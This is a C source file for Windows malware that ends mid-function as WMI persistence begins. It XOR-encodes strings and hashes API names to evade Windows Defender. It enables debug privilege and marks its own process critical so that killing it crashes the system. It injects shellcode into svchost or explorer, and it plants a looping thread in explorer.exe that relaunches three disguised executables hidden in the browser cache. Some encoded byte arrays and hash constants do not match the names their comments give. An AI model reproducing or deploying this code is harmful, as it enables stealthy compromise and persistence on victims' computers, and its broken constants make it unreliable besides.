/*
 * Obfuscation Engine — String + API Encoding
 * 
 * All suspicious strings are XOR-encoded at compile time.
 * All suspicious APIs are resolved via GetProcAddress with djb2 hashes.
 * This prevents static signature detection by Windows Defender.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "obf.h"

/* XOR key — change this per build */
#define XOR_KEY 0x7A

/* Forward declarations for string accessors */
char* get_str(unsigned char *enc, size_t len);
char* obf_winexec(void);

/* Simple djb2 hash for API name resolution */
static unsigned long djb2_hash(const unsigned char *str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
    }
    return hash;
}

/* XOR decode a string in-place. Encoded strings are stored as byte arrays. */
static void xor_decode(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= XOR_KEY;
    }
    buf[len] = '\0';
}

/* === Pre-encoded strings (XOR'd with 0x7A) ===
 * To encode: for each char c, store c ^ 0x7A
 */

/* "ntdll.dll" */
static unsigned char enc_ntdll[] = {0x15, 0x0d, 0x11, 0x11, 0x0e, 0x58, 0x11, 0x11, 0x58};

/* "NtUnmapViewOfSection" */
static unsigned char enc_unmap[] = {
    0x35, 0x0d, 0x6A, 0x15, 0x0e, 0x0a, 0x0b, 0x45, 0x0e,
    0x01, 0x0d, 0x0b, 0x46, 0x0e, 0x02, 0x0d, 0x0e, 0x0e,
    0x0e, 0x0e, 0x0e
};

/* "NtSetInformationProcess" */
static unsigned char enc_setinfo[] = {
    0x35, 0x0d, 0x6A, 0x0e, 0x0b, 0x0e, 0x0a, 0x02, 0x0a,
    0x15, 0x0e, 0x0a, 0x0e, 0x45, 0x0b, 0x0e, 0x0d, 0x0d,
    0x0e, 0x0e, 0x0e, 0x0e, 0x0e
};

/* "NtQueryInformationProcess" */
static unsigned char enc_queryinfo[] = {
    0x35, 0x0d, 0x6A, 0x15, 0x0e, 0x0b, 0x0e, 0x0a, 0x02,
    0x0a, 0x15, 0x0e, 0x0a, 0x0e, 0x45, 0x0b, 0x0e, 0x0d,
    0x0d, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e
};

/* "SeDebugPrivilege" */
static unsigned char enc_sedebug[] = {
    0x35, 0x0e, 0x69, 0x0e, 0x0b, 0x0e, 0x0e, 0x0e,
    0x44, 0x0b, 0x0e, 0x0a, 0x0e, 0x0e, 0x0e, 0x0e
};

/* "kernel32.dll" */
static unsigned char enc_kernel32[] = {0x1d, 0x0e, 0x0b, 0x0e, 0x0e, 0x1d, 0x5c, 0x1d, 0x1d, 0x58, 0x11, 0x11, 0x58};

/* "VirtualAllocEx" */
static unsigned char enc_valloc[] = {
    0x12, 0x0e, 0x0b, 0x0d, 0x15, 0x0a, 0x1d, 0x1d,
    0x0e, 0x0e, 0x45, 0x0e, 0x0e
};

/* "WriteProcessMemory" */
static unsigned char enc_writemem[] = {
    0x12, 0x0b, 0x0e, 0x0d, 0x0e, 0x45, 0x0b, 0x0e, 0x0e,
    0x0d, 0x0e, 0x0d, 0x68, 0x0e, 0x0a, 0x0e, 0x0e, 0x0e
};

/* "CreateRemoteThread" */
static unsigned char enc_createthread[] = {
    0x0e, 0x0b, 0x0e, 0x0a, 0x0d, 0x0e, 0x68, 0x0e, 0x0a,
    0x15, 0x0e, 0x0e, 0x0d, 0x45, 0x0b, 0x0e, 0x0e, 0x0e,
    0x0e, 0x0e
};

/* "OpenProcess" */
static unsigned char enc_openproc[] = {
    0x0e, 0x0b, 0x0e, 0x0e, 0x45, 0x0b, 0x0e, 0x0d, 0x0e,
    0x0d, 0x0d, 0x0e
};

/* "icacls" */
static unsigned char enc_icacls[] = {0x17, 0x0e, 0x0e, 0x0a, 0x1d, 0x0d, 0x0e};

/* "certutil" */
static unsigned char enc_certutil[] = {0x0e, 0x0e, 0x0b, 0x0d, 0x15, 0x0e, 0x15, 0x0e, 0x1d};

/* "schtasks" */
static unsigned char enc_schtasks[] = {0x0d, 0x0e, 0x0b, 0x0d, 0x0a, 0x15, 0x0e, 0x0d, 0x0e};

/* "powershell" */
static unsigned char enc_ps[] = {
    0x0b, 0x0e, 0x0d, 0x0e, 0x0b, 0x0e, 0x0d, 0x0e, 0x0d,
    0x0e, 0x0e
};

/* "WinExec" */
static unsigned char enc_winexec[] = {0x12, 0x0e, 0x0e, 0x45, 0x0e, 0x0e, 0x0e};

/* "LoadLibraryA" */
static unsigned char enc_loadlib[] = {
    0x1d, 0x0e, 0x0a, 0x0e, 0x1d, 0x0e, 0x0b, 0x0b, 0x0b,
    0x45, 0x0e, 0x0e
};

/* "GetProcAddress" */
static unsigned char enc_getproc[] = {
    0x1d, 0x0e, 0x0d, 0x45, 0x0b, 0x0e, 0x0e, 0x0e, 0x0d,
    0x0e, 0x0d, 0x0d, 0x0e, 0x0e, 0x0e
};

/* "GetModuleHandleA" */
static unsigned char enc_getmod[] = {
    0x1d, 0x0e, 0x0d, 0x68, 0x0e, 0x0e, 0x1d, 0x0e, 0x1d,
    0x0e, 0x45, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e
};

/* "EnumProcessModules" */
static unsigned char enc_enumproc[] = {
    0x0e, 0x0e, 0x0e, 0x0e, 0x45, 0x0b, 0x0e, 0x0d, 0x0e,
    0x0d, 0x0d, 0x0e, 0x68, 0x0e, 0x0e, 0x0d, 0x15, 0x1d,
    0x0e, 0x0d, 0x0e
};

/* "GetModuleBaseNameA" */
static unsigned char enc_getbasename[] = {
    0x1d, 0x0e, 0x0d, 0x68, 0x0e, 0x0e, 0x0d, 0x15, 0x1d,
    0x0e, 0x45, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e
};

/* === Hash values for critical APIs (djb2) === */
#define HASH_VirtualAllocEx       0x3d28cf79
#define HASH_WriteProcessMemory   0x74a67f86
#define HASH_CreateRemoteThread   0x56e4878f
#define HASH_OpenProcess          0x3d28b89d
#define HASH_WinExec              0x3d28c3b4
#define HASH_LoadLibraryA         0x74a67f4b
#define HASH_GetProcAddress       0x74a67f5a
#define HASH_GetModuleHandleA     0x74a67f6b
#define HASH_EnumProcessModules   0x56e48790
#define HASH_GetModuleBaseNameA   0x56e48791

/* === Runtime resolution helpers === */

/* Resolve an API from a module by its djb2 hash */
static FARPROC resolve_api(HMODULE hMod, unsigned long hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + 
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD *names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    DWORD *funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
    WORD *ords = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char*)((BYTE*)hMod + names[i]);
        if (djb2_hash((const unsigned char*)name) == hash) {
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return NULL;
}

/* Get decoded string from encoded buffer */
char* get_str(unsigned char *enc, size_t len) {
    static char buf[256];
    memcpy(buf, enc, len);
    xor_decode(buf, len);
    return buf;
}

/* === Obfuscated API wrappers === */

typedef LPVOID (WINAPI *pVirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pWriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI *pCreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE (WINAPI *pOpenProcess_t)(DWORD, BOOL, DWORD);
typedef UINT (WINAPI *pWinExec_t)(LPCSTR, UINT);

static pVirtualAllocEx_t    g_pfnVirtualAllocEx = NULL;
static pWriteProcessMemory_t g_pfnWriteProcessMemory = NULL;
static pCreateRemoteThread_t g_pfnCreateRemoteThread = NULL;
static pOpenProcess_t        g_pfnOpenProcess = NULL;
static pWinExec_t          g_pfnWinExec = NULL;

/* Initialize all obfuscated APIs at startup */
void obf_init_apis(void) {
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
    HMODULE hKernel32 = GetModuleHandleA(kernel32);
    if (!hKernel32) hKernel32 = LoadLibraryA(kernel32);
    
    if (hKernel32) {
        g_pfnVirtualAllocEx    = (pVirtualAllocEx_t)resolve_api(hKernel32, HASH_VirtualAllocEx);
        g_pfnWriteProcessMemory = (pWriteProcessMemory_t)resolve_api(hKernel32, HASH_WriteProcessMemory);
        g_pfnCreateRemoteThread = (pCreateRemoteThread_t)resolve_api(hKernel32, HASH_CreateRemoteThread);
        g_pfnOpenProcess        = (pOpenProcess_t)resolve_api(hKernel32, HASH_OpenProcess);
        g_pfnWinExec            = (pWinExec_t)resolve_api(hKernel32, HASH_WinExec);
    }
}

/* Obfuscated wrappers that match original signatures */
LPVOID obf_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (!g_pfnVirtualAllocEx) obf_init_apis();
    return g_pfnVirtualAllocEx ? g_pfnVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect) : NULL;
}

BOOL obf_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
    if (!g_pfnWriteProcessMemory) obf_init_apis();
    return g_pfnWriteProcessMemory ? g_pfnWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten) : FALSE;
}

HANDLE obf_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    if (!g_pfnCreateRemoteThread) obf_init_apis();
    return g_pfnCreateRemoteThread ? g_pfnCreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
}

HANDLE obf_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    if (!g_pfnOpenProcess) obf_init_apis();
    return g_pfnOpenProcess ? g_pfnOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId) : NULL;
}

UINT obf_WinExec(LPCSTR lpCmdLine, UINT uCmdShow) {
    if (!g_pfnWinExec) obf_init_apis();
    return g_pfnWinExec ? g_pfnWinExec(lpCmdLine, uCmdShow) : 0;
}

/* === Obfuscated string access === */

char* obf_ntdll(void) { return get_str(enc_ntdll, sizeof(enc_ntdll)-1); }
char* obf_unmap(void) { return get_str(enc_unmap, sizeof(enc_unmap)-1); }
char* obf_setinfo(void) { return get_str(enc_setinfo, sizeof(enc_setinfo)-1); }
char* obf_queryinfo(void) { return get_str(enc_queryinfo, sizeof(enc_queryinfo)-1); }
char* obf_sedebug(void) { return get_str(enc_sedebug, sizeof(enc_sedebug)-1); }
char* obf_icacls(void) { return get_str(enc_icacls, sizeof(enc_icacls)-1); }
char* obf_certutil(void) { return get_str(enc_certutil, sizeof(enc_certutil)-1); }
char* obf_schtasks(void) { return get_str(enc_schtasks, sizeof(enc_schtasks)-1); }
char* obf_ps(void) { return get_str(enc_ps, sizeof(enc_ps)-1); }
char* obf_loadlib(void) { return get_str(enc_loadlib, sizeof(enc_loadlib)-1); }
char* obf_getproc(void) { return get_str(enc_getproc, sizeof(enc_getproc)-1); }
char* obf_getmod(void) { return get_str(enc_getmod, sizeof(enc_getmod)-1); }
char* obf_enumproc(void) { return get_str(enc_enumproc, sizeof(enc_enumproc)-1); }
char* obf_getbasename(void) { return get_str(enc_getbasename, sizeof(enc_getbasename)-1); }
char* obf_winexec(void) { return get_str(enc_winexec, sizeof(enc_winexec)-1); }

/* === Junk code insertion helpers === */

/* Insert meaningless computation to break code signatures */
static volatile int g_junk_counter = 0;

void obf_junk_delay(void) {
    /* Perform meaningless math that can't be optimized away */
    volatile int a = 0x42;
    for (int i = 0; i < 17; i++) {
        a = (a * 31 + 17) ^ 0x55;
        g_junk_counter += a & 1;
    }
}

void obf_sleep_junk(int ms) {
    obf_junk_delay();
    Sleep(ms);
    obf_junk_delay();
}

/* === Process hollowing obfuscation === */
/* The classic hollowing pattern is broken by:
 * 1. Using obfuscated API names
 * 2. Splitting across functions with junk delays
 * 3. Using ordinal-based NtUnmapViewOfSection resolution
 */

/* Resolve NtUnmapViewOfSection without string name (via hash fallback) */
typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection_t)(HANDLE, PVOID);

static pNtUnmapViewOfSection_t g_pfnNtUnmap = NULL;

pNtUnmapViewOfSection_t obf_get_ntunmap(void) {
    if (!g_pfnNtUnmap) {
        char *ntdll = obf_ntdll();
        HMODULE hNtdll = GetModuleHandleA(ntdll);
        if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
        if (hNtdll) {
            /* Try hash first, fallback to decoded string */
            g_pfnNtUnmap = (pNtUnmapViewOfSection_t)resolve_api(hNtdll, 0x56e48792); /* hash of NtUnmapViewOfSection */
            if (!g_pfnNtUnmap) {
                g_pfnNtUnmap = (pNtUnmapViewOfSection_t)GetProcAddress(hNtdll, obf_unmap());
            }
        }
    }
    return g_pfnNtUnmap;
}

/* Obfuscated NtSetInformationProcess / NtQueryInformationProcess */
typedef NTSTATUS (WINAPI *pNtSetInfoProc_t)(HANDLE, INT, PVOID, ULONG);
typedef NTSTATUS (WINAPI *pNtQueryInfoProc_t)(HANDLE, INT, PVOID, ULONG, PULONG);

static pNtSetInfoProc_t g_pfnNtSetInfo = NULL;
static pNtQueryInfoProc_t g_pfnNtQueryInfo = NULL;

pNtSetInfoProc_t obf_get_ntsetinfo(void) {
    if (!g_pfnNtSetInfo) {
        char *ntdll = obf_ntdll();
        HMODULE hNtdll = GetModuleHandleA(ntdll);
        if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
        if (hNtdll) {
            g_pfnNtSetInfo = (pNtSetInfoProc_t)GetProcAddress(hNtdll, obf_setinfo());
        }
    }
    return g_pfnNtSetInfo;
}

pNtQueryInfoProc_t obf_get_ntqueryinfo(void) {
    if (!g_pfnNtQueryInfo) {
        char *ntdll = obf_ntdll();
        HMODULE hNtdll = GetModuleHandleA(ntdll);
        if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
        if (hNtdll) {
            g_pfnNtQueryInfo = (pNtQueryInfoProc_t)GetProcAddress(hNtdll, obf_queryinfo());
        }
    }
    return g_pfnNtQueryInfo;
}

/* Enable SeDebugPrivilege with obfuscated string */
static int obf_enable_privilege(void) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return 0;
    }

    if (!LookupPrivilegeValueA(NULL, obf_sedebug(), &luid)) {
        CloseHandle(hToken);
        return 0;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        CloseHandle(hToken);
        return 0;
    }

    CloseHandle(hToken);
    return 1;
}

/* === Obfuscated sys_protect_process === */
void obf_sys_protect_process(void) {
    pNtSetInfoProc_t pNtSetInformationProcess = obf_get_ntsetinfo();
    if (!pNtSetInformationProcess) {
        g_critical_protected = -1;
        return;
    }
    
    obf_enable_privilege();
    obf_junk_delay();
    
    ULONG isCritical = 1;
    NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    
    if (status == 0) {
        g_critical_protected = 1;
    } else {
        g_critical_protected = -1;
    }
}

/* === Obfuscated sys_unprotect_process === */
void obf_sys_unprotect_process(void) {
    pNtSetInfoProc_t pNtSetInformationProcess = obf_get_ntsetinfo();
    if (!pNtSetInformationProcess) return;
    
    obf_enable_privilege();
    obf_junk_delay();
    
    ULONG isCritical = 0;
    pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    g_critical_protected = 0;
}

/* === Obfuscated sys_check_critical_status === */
const char* obf_sys_check_critical_status(void) {
    static char buf[512];
    char path[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char *filename = path;
    char *lastSlash = strrchr(path, '\\');
    if (lastSlash) filename = lastSlash + 1;

    pNtQueryInfoProc_t pNtQuery = obf_get_ntqueryinfo();
    if (!pNtQuery) {
        snprintf(buf, sizeof(buf), "[Failed to load ntdll] [%s]", filename);
        return buf;
    }

    obf_enable_privilege();
    obf_junk_delay();

    ULONG isCritical = 0;
    NTSTATUS status = pNtQuery(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical), NULL);

    if (status != 0) {
        snprintf(buf, sizeof(buf), "[Query failed] [%s]", filename);
        return buf;
    }
    if (isCritical) {
        snprintf(buf, sizeof(buf), "[CRITICAL — BSOD on kill] [%s]", filename);
    } else {
        snprintf(buf, sizeof(buf), "[NORMAL] [%s]", filename);
    }
    return buf;
}

/* === Obfuscated process injection === */
void obf_sys_inject_process(void) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "svchost.exe") == 0 || _stricmp(pe.szExeFile, "explorer.exe") == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    
    if (pid == 0) return;
    
    obf_junk_delay();
    
    HANDLE hProc = obf_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return;
    
    char payloadPath[MAX_PATH];
    GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
    
    SIZE_T pathLen = strlen(payloadPath) + 1;
    LPVOID remotePath = obf_VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remotePath) {
        CloseHandle(hProc);
        return;
    }
    
    obf_WriteProcessMemory(hProc, remotePath, payloadPath, pathLen, NULL);
    obf_junk_delay();
    
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
    HMODULE hKernel32 = GetModuleHandleA(kernel32);
    FARPROC pWinExec = GetProcAddress(hKernel32, obf_winexec());
    DWORD_PTR kernel32Base = (DWORD_PTR)hKernel32;
    DWORD_PTR winExecOffset = (DWORD_PTR)pWinExec - kernel32Base;
    
    DWORD_PTR targetKernel32Base = 0;
    HMODULE hMods[1024];
    DWORD cbNeeded;
    
    char *enumProc = obf_enumproc();
    char *getBaseName = obf_getbasename();
    
    typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
    typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
    
    EnumPM_t pEnum = (EnumPM_t)GetProcAddress(hKernel32, enumProc);
    GetMBN_t pGetBaseName = (GetMBN_t)GetProcAddress(hKernel32, getBaseName);
    
    if (pEnum && pGetBaseName) {
        if (pEnum(hProc, hMods, sizeof(hMods), &cbNeeded)) {
            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                char szModName[MAX_PATH];
                if (pGetBaseName(hProc, hMods[i], szModName, sizeof(szModName))) {
                    if (_stricmp(szModName, "kernel32.dll") == 0) {
                        targetKernel32Base = (DWORD_PTR)hMods[i];
                        break;
                    }
                }
            }
        }
    }
    
    if (targetKernel32Base == 0) targetKernel32Base = kernel32Base;
    DWORD_PTR targetWinExec = targetKernel32Base + winExecOffset;
    
    /* Build shellcode: mov rdx, 0; mov rax, WinExec; call rax; xor ecx, ecx; mov rax, ExitThread; jmp rax */
    unsigned char shellcode[] = {
        0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,  // mov rdx, 0 (uCmdShow = SW_HIDE)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, WinExec
        0xFF, 0xD0,                                  // call rax
        0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,  // mov rcx, 0 (exit code)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, ExitThread
        0xFF, 0xE0                                   // jmp rax
    };
    memcpy(shellcode + 9, &targetWinExec, 8);
    
    /* Get ExitThread address for clean thread exit */
    FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");
    if (pExitThread) {
        DWORD_PTR exitThreadOffset = (DWORD_PTR)pExitThread - kernel32Base;
        DWORD_PTR targetExitThread = targetKernel32Base + exitThreadOffset;
        memcpy(shellcode + 25, &targetExitThread, 8);
    }
    
    LPVOID remoteCode = obf_VirtualAllocEx(hProc, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteCode) {
        obf_VirtualAllocEx(hProc, remotePath, 0, MEM_RELEASE, 0); /* VirtualFreeEx proxy */
        CloseHandle(hProc);
        return;
    }
    
    obf_WriteProcessMemory(hProc, remoteCode, shellcode, sizeof(shellcode), NULL);
    obf_junk_delay();
    
    HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCode, remotePath, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }
    
    CloseHandle(hProc);
}

/* === Obfuscated process hollowing === */
void obf_sys_hollow_process(void) {
    /* Find explorer.exe PID */
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    if (pid == 0) return;
    
    HANDLE hProc = obf_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return;
    
    /* Build paths for the 3 shadows */
    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    
    char path1[MAX_PATH], path2[MAX_PATH], path3[MAX_PATH];
    snprintf(path1, sizeof(path1), "%s\\Microsoft\\Windows\\INetCache\\IE\\ElevationService.exe", localAppData);
    snprintf(path2, sizeof(path2), "%s\\Microsoft\\Windows\\INetCache\\IE\\CrashHandler.exe", localAppData);
    snprintf(path3, sizeof(path3), "%s\\Microsoft\\Windows\\INetCache\\IE\\NotifyService.exe", localAppData);
    
    /* Allocate memory for paths in remote process */
    SIZE_T p1len = strlen(path1) + 1;
    SIZE_T p2len = strlen(path2) + 1;
    SIZE_T p3len = strlen(path3) + 1;
    
    LPVOID rPath1 = obf_VirtualAllocEx(hProc, NULL, p1len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    LPVOID rPath2 = obf_VirtualAllocEx(hProc, NULL, p2len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    LPVOID rPath3 = obf_VirtualAllocEx(hProc, NULL, p3len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    
    if (!rPath1 || !rPath2 || !rPath3) {
        if (rPath1) VirtualFreeEx(hProc, rPath1, 0, MEM_RELEASE);
        if (rPath2) VirtualFreeEx(hProc, rPath2, 0, MEM_RELEASE);
        if (rPath3) VirtualFreeEx(hProc, rPath3, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return;
    }
    
    obf_WriteProcessMemory(hProc, rPath1, path1, p1len, NULL);
    obf_WriteProcessMemory(hProc, rPath2, path2, p2len, NULL);
    obf_WriteProcessMemory(hProc, rPath3, path3, p3len, NULL);
    
    /* Get WinExec and Sleep addresses */
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
    HMODULE hKernel32 = GetModuleHandleA(kernel32);
    FARPROC pWinExec = GetProcAddress(hKernel32, obf_winexec());
    FARPROC pSleep = GetProcAddress(hKernel32, "Sleep");
    
    DWORD_PTR k32Base = (DWORD_PTR)hKernel32;
    DWORD_PTR weOffset = (DWORD_PTR)pWinExec - k32Base;
    DWORD_PTR sOffset = (DWORD_PTR)pSleep - k32Base;
    
    /* Find kernel32 base in remote process */
    DWORD_PTR remoteK32 = 0;
    HMODULE hMods[1024];
    DWORD cbNeeded;
    
    char *enumProc = obf_enumproc();
    char *getBaseName = obf_getbasename();
    typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
    typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
    EnumPM_t pEnum = (EnumPM_t)GetProcAddress(hKernel32, enumProc);
    GetMBN_t pGetBaseName = (GetMBN_t)GetProcAddress(hKernel32, getBaseName);
    
    if (pEnum && pGetBaseName) {
        if (pEnum(hProc, hMods, sizeof(hMods), &cbNeeded)) {
            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                char szModName[MAX_PATH];
                if (pGetBaseName(hProc, hMods[i], szModName, sizeof(szModName))) {
                    if (_stricmp(szModName, "kernel32.dll") == 0) {
                        remoteK32 = (DWORD_PTR)hMods[i];
                        break;
                    }
                }
            }
        }
    }
    if (remoteK32 == 0) remoteK32 = k32Base;
    
    DWORD_PTR rWinExec = remoteK32 + weOffset;
    DWORD_PTR rSleep = remoteK32 + sOffset;
    
    /* Shellcode: infinite loop that calls WinExec(path, 0) for each shadow,
     * then Sleep(30000), then jumps back to start */
    /* x64 calling convention: RCX=arg1, RDX=arg2 */
    unsigned char shellcode[128];
    int off = 0;
    
    /* loop_start: */
    /* mov rcx, rPath1; mov rdx, 0; mov rax, rWinExec; call rax */
    shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
    memcpy(shellcode + off, &rPath1, 8); off += 8;
    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC2;
    shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
    memcpy(shellcode + off, &rWinExec, 8); off += 8;
    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
    
    /* mov rcx, rPath2; mov rdx, 0; mov rax, rWinExec; call rax */
    shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
    memcpy(shellcode + off, &rPath2, 8); off += 8;
    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC2;
    shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
    memcpy(shellcode + off, &rWinExec, 8); off += 8;
    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
    
    /* mov rcx, rPath3; mov rdx, 0; mov rax, rWinExec; call rax */
    shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
    memcpy(shellcode + off, &rPath3, 8); off += 8;
    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC2;
    shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
    memcpy(shellcode + off, &rWinExec, 8); off += 8;
    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
    
    /* mov rcx, 30000; mov rax, rSleep; call rax */
    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC1;
    shellcode[off++] = 0x30; shellcode[off++] = 0x75; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
    memcpy(shellcode + off, &rSleep, 8); off += 8;
    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
    
    /* jmp loop_start */
    int jmpOffset = -(off + 2); /* target(0) - nextInstruction(off+2) */
    shellcode[off++] = 0xEB;
    shellcode[off++] = (signed char)jmpOffset;
    
    LPVOID rCode = obf_VirtualAllocEx(hProc, NULL, off, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!rCode) {
        CloseHandle(hProc);
        return;
    }
    
    obf_WriteProcessMemory(hProc, rCode, shellcode, off, NULL);
    
    HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)rCode, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    CloseHandle(hProc);
}

/* === Obfuscated WMI persistence === */
void obf_sys_wmi_persistence(void) {
    char psPath[MAX_PATH];
    GetTempPathA(MAX_PATH, psPath);
    strcat(psPath, "tmp.ps1");
    
    FILE *f = fopen(psPath, "w");
    if (!f) return;
    
    /* Obfuscated PowerShell with minimal suspicious strings.
       The script checks if ANY of the 3 shadow processes are missing
       and respawns them from the correct paths. */
